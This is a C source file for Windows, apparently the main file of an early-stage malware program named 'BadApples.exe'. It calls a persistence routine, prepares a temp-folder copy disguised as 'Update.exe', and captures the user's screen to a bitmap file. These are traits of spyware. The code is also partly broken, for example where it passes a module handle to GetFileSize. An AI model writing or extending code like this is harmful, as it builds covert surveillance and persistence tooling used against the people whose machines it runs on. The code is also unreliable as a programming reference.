#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>
#include "common.h"

#pragma comment(lib, "Shlwapi.lib")

BOOL ReadLocalFile( /*OUT PVOID* pFileBuff, OUT DWORD* pdwSize*/ )
{
	DWORD dwSize = 0x00;
	PVOID pAddress = NULL;
	HMODULE hModule = NULL;

	if ( !( hModule = GetModuleHandleW( NULL ) ) )
	{
		LOG_ERR( "GetModuleHandle" );
		return -1;
	}
	printf( "(+) BadApples.exe Base Address @ 0x%p\n", hModule );

	if ( !( dwSize = GetFileSize( hModule, NULL ) ) )
	{
		LOG_ERR( "GetFileSize" );
		return -1;
	}
	printf( "(+) File Size : ( bytes %d )\n", dwSize );


	return TRUE;
}

int main( void )
{
	PVOID pAddress = NULL;
	ULONG Length = 0x00;
	LPCWSTR tempPath[ MAX_PATH ];

	/* ---------------------------------------------------------------------------------------------------------------------------------------- */

	ReadLocalFile();

	if ( !ActivatePersistance() )
	{
		return -1;
	}

	if ( !GetTempPathW( MAX_PATH, &tempPath ) )
	{
		LOG_ERR( "GetTempPathW" );
		return -1;
	}
	StrCatW( &tempPath, L"Update.exe" );

	//		<><><><><><>[ NEXT COPY TO TEMP DIRECTORY ]<><><><><><>

	/* ---------------------------------------------------------------------------------------------------------------------------------------- */

	// store screenshot in memory
	if ( !ScreenshotBmp( &pAddress, &Length ) )
	{
		return -1;
	}
	printf( "(+) Screenshot Captured...\n" );

	// write the screenshot to disk
	if ( !WriteFileToDiskA( "screenshot.bmp", pAddress, Length ) )
	{
		return -1;
	}
	printf( "(+) Screenshot has been written to disk...\n" );

	// free the buffer
	RtlSecureZeroMemory( pAddress, Length );
	HeapFree( GetProcessHeap(), HEAP_ZERO_MEMORY, pAddress );

	return 0;
}
